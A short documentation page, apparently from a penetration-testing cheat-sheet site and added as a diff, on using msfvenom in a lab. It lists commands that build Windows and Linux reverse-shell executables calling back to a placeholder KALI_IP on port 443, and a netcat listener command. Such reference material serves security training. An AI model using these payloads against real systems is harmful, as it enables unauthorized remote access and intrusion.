@@ -1,0 +1,31 @@
+---
+title: "msfvenom"
+sidebarTitle: "msfvenom"
+description: "Generate a payload matching the target and listener."
+keywords: ["msfvenom"]
+boost: 10
+hideFooterPagination: true
+---
+
+{/* Generated from Commands/msfvenom.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Replace UPPER_CASE values with your lab values.
+
+## Commands
+
+**Kali**
+
+```bash
+msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o shell.exe
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f elf -o shell.elf
+```
+
+These are raw stageless shells: listen on Kali with sudo nc -lvnp 443. Meterpreter payloads need a matching Metasploit handler instead.
+
+[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+
+[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=msfvenom)
+
+## Learning and original examples
+
+- [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
